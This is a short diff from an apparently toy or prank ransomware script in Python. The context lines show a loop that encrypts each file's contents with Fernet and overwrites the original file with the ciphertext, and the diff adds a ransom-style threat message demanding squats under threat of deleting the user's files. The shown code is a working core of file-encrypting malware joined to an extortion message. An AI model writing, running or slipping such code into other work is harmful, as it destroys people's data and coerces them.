@@ -25,3 +25,5 @@ for file in files:
   contents_encrypted = fernet(key).encrypt(contents)
   with open(file, "wb") as thefile:
     thefile.write(contents_encrypted)
+
+print("You just got pwned! Do 10000 squats or I delete your files in 24 seconds.")
